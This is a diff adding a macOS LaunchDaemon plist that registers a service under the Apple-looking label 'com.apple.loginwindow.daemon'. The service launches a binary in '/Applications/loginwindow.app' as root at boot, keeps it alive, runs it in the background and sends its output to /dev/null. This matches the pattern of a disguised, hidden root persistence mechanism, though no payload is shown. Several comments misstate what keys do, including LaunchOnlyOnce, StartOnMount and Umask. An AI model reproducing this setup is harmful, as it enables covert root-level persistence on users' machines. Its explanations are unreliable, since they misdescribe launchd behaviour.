@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<!-- Service identifier (system-level) -->
+	<key>Label</key>
+	<string>com.apple.loginwindow.daemon</string>
+
+	<!-- Program to run (must be in /Applications or /Library) -->
+	<key>ProgramArguments</key>
+	<array>
+		<string>/Applications/loginwindow.app/Contents/MacOS/loginwindow</string>
+	</array>
+
+	<!-- Run at system startup (LaunchDaemon) -->
+	<key>RunAtLoad</key>
+	<true/>
+
+	<!-- Keep running if it crashes -->
+	<key>KeepAlive</key>
+	<true/>
+
+	<!-- Don't show any UI -->
+	<key>StandardOutPath</key>
+	<string>/dev/null</string>
+	<key>StandardErrorPath</key>
+	<string>/dev/null</string>
+
+	<!-- Run as root (system-level) -->
+	<key>UserName</key>
+	<string>root</string>
+
+	<!-- Run in background -->
+	<key>ProcessType</key>
+	<string>Background</string>
+
+	<!-- Don't announce when launched -->
+	<key>LaunchOnlyOnce</key>
+	<false/>
+
+	<!-- Load on login -->
+	<key>StartOnMount</key>
+	<true/>
+
+	<!-- Umask for file creation (700 = owner read/write/execute only) -->
+	<key>Umask</key>
+	<integer>700</integer>
+
+	<!-- Environment variables (optional) -->
+	<key>EnvironmentVariables</key>
+	<dict>
+		<key>PATH</key>
+		<string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
+	</dict>
+
+	<!-- Session type (system-level, not user session) -->
+	<key>SessionType</key>
+	<string>System</string>
+
+</dict>
+</plist>
